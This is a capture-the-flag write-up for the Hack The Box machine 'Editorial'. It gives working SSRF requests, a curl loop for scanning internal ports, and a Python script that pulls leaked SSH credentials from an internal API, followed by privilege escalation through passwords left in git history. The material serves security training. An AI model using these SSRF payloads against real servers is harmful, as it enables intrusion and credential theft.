---
title: "HTB Writeup: Editorial"
date: 2024-09-15
description: "Server-Side Request Forgery chained with git log enumeration to escalate privileges on a Linux box."
tags: ["htb", "ssrf", "linux", "git", "privesc"]
category: writeup
difficulty: easy
draft: false
---

## Enumeration

Start with a full port scan to identify open services.

```bash
nmap -sC -sV -oN editorial.nmap 10.10.11.20
```

Output shows port 80 (HTTP) and 22 (SSH). The web app is a book publishing platform.

## Discovering SSRF

The `/upload-cover` endpoint accepts a URL parameter. Testing with an internal address reveals the service fetches arbitrary URLs:

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: application/x-www-form-urlencoded

bookurl=http://127.0.0.1:5000/&bookfile=
```

The response contains JSON from an internal Flask API. Enumerate the endpoints:

```bash
for port in 5000 8080 8000 3000; do
  curl -s -X POST http://editorial.htb/upload-cover \
    -d "bookurl=http://127.0.0.1:${port}/&bookfile=" | grep -q "200" && echo "Open: $port"
done
```

## Foothold

The internal API at `127.0.0.1:5000` exposes `/api/latest/metadata/messages/authors`. Fetch it:

```python
import requests

url = "http://editorial.htb/upload-cover"
payload = {
    "bookurl": "http://127.0.0.1:5000/api/latest/metadata/messages/authors",
    "bookfile": ""
}

r = requests.post(url, data=payload)
# response is a filename — fetch it
filename = r.text.strip()
content = requests.get(f"http://editorial.htb/static/uploads/{filename}")
print(content.json())
```

The JSON leaks SSH credentials for user `dev`.

## Privilege Escalation

Inside the box, `/opt/internal_apps/clone_changes` contains a git repository. Check the log:

```bash
cd /opt/internal_apps/clone_changes
git log --oneline
```

```
b73481b Fix wrong credentials
1e84a03 Change admin password
```

Inspect the commit that changed the password:

```bash
git show b73481b
```

The diff reveals the new `prod` user password in plaintext. `su prod` + `sudo -l` shows unrestricted `sudo`, giving root.

## Timeline

| Step | Time |
|------|------|
| SSRF discovery | 15 min |
| Internal API enum | 10 min |
| SSH foothold | 5 min |
| Git log privesc | 10 min |
